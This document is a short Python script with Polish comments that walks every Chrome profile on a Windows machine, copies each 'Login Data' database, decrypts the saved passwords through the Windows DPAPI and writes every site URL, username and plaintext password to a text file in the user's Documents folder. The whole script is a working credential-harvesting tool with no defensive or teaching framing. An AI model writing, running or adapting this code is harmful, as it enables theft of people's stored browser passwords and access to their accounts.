import os
import sqlite3
import shutil
import win32crypt
import json

def get_chrome_profiles():
    base_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data'
    profiles = []

    # Dodaj wszystkie foldery profili, w tym "Default", "Profile 1", "Profile 2", itd.
    for folder in os.listdir(base_path):
        full_path = os.path.join(base_path, folder)
        if os.path.isdir(full_path) and (folder == 'Default' or folder.startswith('Profile')):
            profiles.append((folder, os.path.join(full_path, 'Login Data')))
    return profiles

def extract_passwords_from_db(db_path, profile_name):
    extracted = []
    try:
        temp_db = os.path.join(os.getenv("TEMP"), f"LoginData_{profile_name}.db")
        shutil.copy2(db_path, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, username, encrypted_password in cursor.fetchall():
            try:
                decrypted_data = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                password = decrypted_data.decode()
            except Exception as e:
                password = f"[Error decrypting: {str(e)}]"
            extracted.append((url, username, password))

        cursor.close()
        conn.close()
        os.remove(temp_db)

    except Exception as e:
        extracted.append((f"[ERROR in {profile_name}]", "", str(e)))
    return extracted

def save_passwords_to_file(output_file, all_data):
    with open(output_file, 'w', encoding='utf-8') as f:
        for profile, entries in all_data.items():
            f.write(f"--- Profile: {profile} ---\n")
            for url, user, pwd in entries:
                f.write(f"URL: {url}\nUser: {user}\nPassword: {pwd}\n\n")
            f.write("\n")

if __name__ == '__main__':
    output_path = os.path.join(os.path.expanduser('~'), 'Documents', 'chrome_passwords.txt')
    all_profiles_data = {}
    for profile_name, db_path in get_chrome_profiles():
        if os.path.exists(db_path):
            all_profiles_data[profile_name] = extract_passwords_from_db(db_path, profile_name)

    save_passwords_to_file(output_path, all_profiles_data)
    print(f"Zapisano hasła do: {output_path}")